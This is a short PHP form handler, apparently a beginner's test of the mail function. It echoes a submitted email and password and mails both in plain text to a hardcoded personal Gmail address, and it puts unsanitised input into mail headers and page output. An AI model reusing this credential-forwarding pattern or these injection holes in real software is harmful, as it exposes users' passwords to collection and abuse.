<?php
 if (!empty($_POST)) {
     $action = $_POST['action'];
     $email = $_POST['email'];
     $password = $_POST['password'];
     if ($action == 'mailer') {

         $message = 'Voici vos identifiants d\'inscription :' . PHP_EOL;
         $message .= 'Email : ' . $email . PHP_EOL;
         $message .= 'Mot de passe : ' . PHP_EOL . $password;
         echo $message;

         $from = $email;
         $to = "enzovargaspro83520@gmail.com";
         $subject = "test";
         $headers = "De :" . $from;
         mail($to, $subject, $message, $headers);
         echo "<br> L'email a été envoyé <br/>";
     } else {
         echo '<br/><strong>Bouton non géré !</strong><br/>';
     }
 }
?>